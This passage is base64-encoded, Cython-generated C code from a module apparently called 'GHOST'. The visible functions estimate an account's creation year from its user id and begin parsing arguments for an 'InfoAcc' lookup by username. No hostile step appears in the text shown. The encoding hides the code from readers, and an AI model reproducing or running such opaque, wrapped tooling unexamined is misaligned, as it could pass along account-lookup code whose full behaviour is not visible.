B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTEpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTE7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTc3NTAwMDEsIF9fcHl4X3ZfdWlkLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjcwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkge1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTtcbiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yNzk3NjAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjcwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTIpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTI7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjc5NzYwMDAxLCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCkpIHtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOTAwOTkwMDAwLCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjcyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDI3MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIGlmIChfX3B5eF90XzUpIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEzKTtcbiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDEzO1xuICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47XG5cbiAgICAgICAgXG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzkwMDk5MDAwMSwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE2MjkwMTAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjc0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTQpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTQ7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzI1MDAwMDAwMDAsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjc2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTUpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTU7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzM3MTM2Njg3ODYsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyNzgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjc4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTYpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTY7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMzcxMzY2ODc4NiwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzU2OTk3ODUyMTcsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjgwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTcpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTc7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfNTY5OTc4NTIxNywgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50Xzg1MDc5NDA2MzQsIFB5X0xUKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgfVxuICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjgyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfNSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTgpO1xuICAgICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTg7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfODUwNzk0MDYzNCwgX19weXhfdl91aWQsIFB5X0xFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyODQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X3VpZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIxMjU0MDI5ODM0LCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjg0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNSA8IDApKSkgX19QWVhfRVJSKDAsIDI4NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIGlmIChfX3B5eF90XzUpIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE5KTtcbiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDE5O1xuICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47XG5cbiAgICAgICAgXG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgIHtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjAyMF8yMDIzKTtcbiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjAyMF8yMDIzO1xuICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47XG4gICAgICB9XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX3B5eF9MM19lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuXG4gICAgXG4gICAgX19weXhfdF82ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpO1xuICAgIGlmIChfX3B5eF90XzYpIHtcbiAgICAgIF9fUHl4X0VyclJlc3RvcmUoMCwwLDApO1xuXG4gICAgICBcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8pO1xuICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfO1xuICAgICAgZ290byBfX3B5eF9MNl9leGNlcHRfcmV0dXJuO1xuICAgIH1cbiAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjtcblxuICAgIFxuICAgIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MN190cnlfcmV0dXJuOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTtcbiAgICBnb3RvIF9fcHl4X0wwO1xuICAgIF9fcHl4X0w2X2V4Y2VwdF9yZXR1cm46O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpO1xuICAgIGdvdG8gX19weXhfTDA7XG4gIH1cblxuICBcblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0FkZFRyYWNlYmFjaygidHQuR0hPU1QuZGF0ZSIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19weXhfTDA6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdWlkKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydHRfNUdIT1NUXzIxSW5mb0FjYyhQeU9iamVjdCAqX19weXhfc2VsZiwgXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcblB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbHNlXG5QeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydHRfNUdIT1NUXzIxSW5mb0FjYyA9IHsiSW5mb0FjYyIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnR0XzVHSE9TVF8yMUluZm9BY2MsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0dF81R0hPU1RfMjFJbmZvQWNjKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJuYW1lID0gMDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9nZyA9IDA7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzO1xuICAjZW5kaWZcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCogdmFsdWVzWzNdID0gezAsMCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJJbmZvQWNjICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlcm5hbWUsJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZywwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDI5MSwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAzOlxuICAgICAgICB2YWx1ZXNbMl0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMik7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzJdKSkgX19QWVhfRVJSKDAsIDI5MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMjpcbiAgICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAyOTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMjkxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7XG4gICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiSW5mb0FjYyIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjkxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAzOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJJbmZvQWNjIiwgMSwgMywgMywgaSk7IF9fUFlYX0VSUigwLCAyOTEsIF9fcHl4X0wzX2Vycm9yKSB9XG4gICAgICB9XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAzKSkge1xuICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICB9IGVsc2Uge1xuICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2F